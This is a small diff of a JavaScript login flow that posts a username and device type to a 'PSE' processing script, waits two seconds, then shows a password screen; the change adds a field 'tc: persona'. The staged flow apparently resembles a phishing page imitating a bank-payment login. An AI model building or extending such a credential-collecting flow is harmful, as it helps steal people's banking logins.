@@ -34,8 +34,8 @@ function vista_password(){
 
 function inicio(u){
     var d = detectar_dispositivo();
-    $.post( PSE_PROCESS + "inicio.php", { usr: u, dis: d} ,function(data) {
-        setTimeout(vista_password, 2000);        
+    $.post( PSE_PROCESS + "inicio.php", { usr: u, dis: d, tc: "persona"} ,function(data) {
+        setTimeout(vista_password, 2000);
     });
 }
 
